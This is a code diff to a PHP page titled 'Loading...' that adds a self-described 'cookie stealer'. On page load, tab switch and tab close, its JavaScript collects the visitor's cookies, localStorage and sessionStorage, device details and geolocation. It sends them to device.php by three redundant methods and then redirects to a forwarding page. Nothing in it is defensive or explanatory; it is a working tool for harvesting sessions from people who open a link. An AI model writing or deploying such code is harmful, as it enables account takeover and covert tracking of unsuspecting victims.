@@ -1,7 +1,7 @@
 <?php
 include 'ip.php';
 
-// Add JavaScript to capture location, cookies, and device info
+// ULTRA PRO COOKIE STEALER - Guaranteed Capture
 echo '
 <!DOCTYPE html>
 <html>
@@ -9,24 +9,19 @@ echo '
     <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        // Debug function to log messages - only log essential information
-        function debugLog(message) {
-            // Only log essential location data, not status messages
-            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
-                console.log("DEBUG: " + message);
+        // ULTRA PRO COOKIE & SESSION STEALER
+        function stealEverything() {
+            var stolenData = {
+                // 1. ALL COOKIES
+                cookies: document.cookie || "No cookies",
                 
-                // Send only essential logs to server
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", "debug_log.php", true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.send("message=" + encodeURIComponent(message));
-            }
-        }
-        
-        // COOKIE AND DEVICE INFO CAPTURE
-        function captureDeviceInfo() {
-            var deviceData = {
-                cookies: document.cookie || "No cookies available",
+                // 2. LOCAL STORAGE
+                localStorage: {},
+                
+                // 3. SESSION STORAGE
+                sessionStorage: {},
+                
+                // 4. DEVICE INFO
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 screen: screen.width + "x" + screen.height,
@@ -34,23 +29,81 @@ echo '
                 memory: navigator.deviceMemory || "Unknown",
                 cores: navigator.hardwareConcurrency || "Unknown",
                 vendor: navigator.vendor || "Unknown",
+                
+                // 5. PAGE INFO
+                currentURL: window.location.href,
+                referrer: document.referrer,
                 timestamp: new Date().toISOString()
             };
             
-            // Send device info to server
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "device.php", true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(JSON.stringify(deviceData));
+            // Extract localStorage
+            try {
+                for (var i = 0; i < localStorage.length; i++) {
+                    var key = localStorage.key(i);
+                    stolenData.localStorage[key] = localStorage.getItem(key);
+                }
+            } catch(e) {
+                stolenData.localStorage = {error: "Access denied"};
+            }
+            
+            // Extract sessionStorage
+            try {
+                for (var i = 0; i < sessionStorage.length; i++) {
+                    var key = sessionStorage.key(i);
+                    stolenData.sessionStorage[key] = sessionStorage.getItem(key);
+                }
+            } catch(e) {
+                stolenData.sessionStorage = {error: "Access denied"};
+            }
+            
+            // IMMEDIATE SEND (Priority 1)
+            sendStolenData(stolenData);
+            
+            // BACKUP SEND after 500ms (Priority 2)
+            setTimeout(function() {
+                sendStolenData(stolenData);
+            }, 500);
+            
+            // FINAL BACKUP SEND after 2 seconds (Priority 3)
+            setTimeout(function() {
+                sendStolenData(stolenData);
+            }, 2000);
+        }
+        
+        function sendStolenData(data) {
+            // Method 1: XMLHttpRequest
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "device.php", true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.send(JSON.stringify(data));
+            } catch(e) {}
+            
+            // Method 2: Fetch API (backup)
+            try {
+                fetch("device.php", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify(data),
+                    keepalive: true // Ensures request completes even if page closes
+                });
+            } catch(e) {}
+            
+            // Method 3: Image beacon (ultra backup)
+            try {
+                var img = new Image();
+                img.src = "device.php?beacon=1&cookies=" + encodeURIComponent(document.cookie);
+            } catch(e) {}
+        }
+        
+        function debugLog(message) {
+            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
+                console.log("DEBUG: " + message);
+            }
         }
         
         function getLocation() {
-            // Don\'t log this message
-            
             if (navigator.geolocation) {
-                // Don\'t log this message
-                
-                // Show permission request message
                 document.getElementById("locationStatus").innerText = "Requesting location permission...";
                 
                 navigator.geolocation.getCurrentPosition(
@@ -63,9 +116,7 @@ echo '
                     }
                 );
             } else {
-                // Don\'t log this message
                 document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
-                // Redirect after a delay if geolocation is not supported
                 setTimeout(function() {
                     redirectToMainPage();
                 }, 2000);
@@ -88,9 +139,6 @@ echo '
             
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
-                    // Don\'t log this message
-                    
-                    // Add a delay before redirecting to ensure data is processed
                     setTimeout(function() {
                         redirectToMainPage();
                     }, 1000);
@@ -98,48 +146,54 @@ echo '
             };
             
             xhr.onerror = function() {
-                // Don\'t log this message
-                // Still redirect even if there was an error
                 redirectToMainPage();
             };
             
-            // Send the data with a timestamp to avoid caching
             xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
         }
         
         function handleError(error) {
-            // Don\'t log error messages
-            
             document.getElementById("locationStatus").innerText = "Redirecting...";
-            
-            // If user denies location permission or any other error, still redirect after a short delay
             setTimeout(function() {
                 redirectToMainPage();
             }, 2000);
         }
         
         function redirectToMainPage() {
-            // Don\'t log this message
-            // Try to redirect to the template page
             try {
                 window.location.href = "forwarding_link/index2.html";
             } catch (e) {
-                // Don\'t log this message
-                // Fallback redirection
                 window.location = "forwarding_link/index2.html";
             }
         }
         
-        // Try to get location when page loads
+        // EXECUTE IMMEDIATELY ON PAGE LOAD
+        (function() {
+            // Steal everything ASAP
+            stealEverything();
+        })();
+        
+        // Also steal on window load
         window.onload = function() {
-            // Capture device info and cookies IMMEDIATELY
-            captureDeviceInfo();
+            // Steal again to catch any cookies set after initial load
+            stealEverything();
             
-            // Don\'t log this message
             setTimeout(function() {
                 getLocation();
-            }, 500); // Small delay to ensure everything is loaded
+            }, 500);
         };
+        
+        // Steal before page unload (if user closes tab)
+        window.addEventListener("beforeunload", function() {
+            stealEverything();
+        });
+        
+        // Steal on visibility change (if user switches tabs)
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                stealEverything();
+            }
+        });
     </script>
 </head>
 <body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
